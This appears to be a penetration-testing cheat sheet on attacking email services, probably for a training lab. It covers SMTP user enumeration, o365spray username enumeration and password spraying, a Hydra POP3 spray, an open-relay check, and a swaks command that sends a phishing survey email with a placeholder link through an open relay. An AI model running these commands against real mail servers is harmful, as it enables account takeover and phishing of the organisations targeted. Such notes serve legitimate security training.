## Enumeration

Refer to Service enumeration.

### Note

|   Port   |	Service     |
|-------|-----------|
|   TCP/25	|   SMTP Unencrypted    |
|   TCP/143	|    IMAP4 Unencrypted  |
|   TCP/110	|    POP3 Unencrypted   |
|   TCP/465	|    SMTP Encrypted |
|   TCP/587	|    SMTP Encrypted/STARTTLS    |
|   TCP/993	|    IMAP4 Encrypted    |
|   TCP/995 | 	POP3 Encrypted  |

## Misconfigurations

### VRFY Command

`VRFY` nstructs receiving SMTP server to check the validity of a particular email username.

### EXPN Command

`EXPN` is similar to VRFY, except that when used with distribution list, it will list all users on that list.

### RCPT TO Command

`RCPT TO` identifies the recipient of email message. 

## Cloud Enumeration

### O365 Spray

Username enumeration and password spraying tool aimed at Microsoft Office 365.

```bash
python3 o365spray.py --validate --domain msplaintext.xyz

## Identify usernames
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz

## Password Spraying
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```

## Password Attacks

### Hydra

Perform password spray / brute force against email service.

```bash
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
```

## Protocol Specific Attacks

### Open Relay

```bash
## Identify open relay SMTP port
nmap -p25 -Pn --script smtp-open-relay 10.10.11.213

## Use any mail client to connect to mail srv and send mail
swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
```

## Noticeable FTP Vulnerability

### CVE-2020-7247

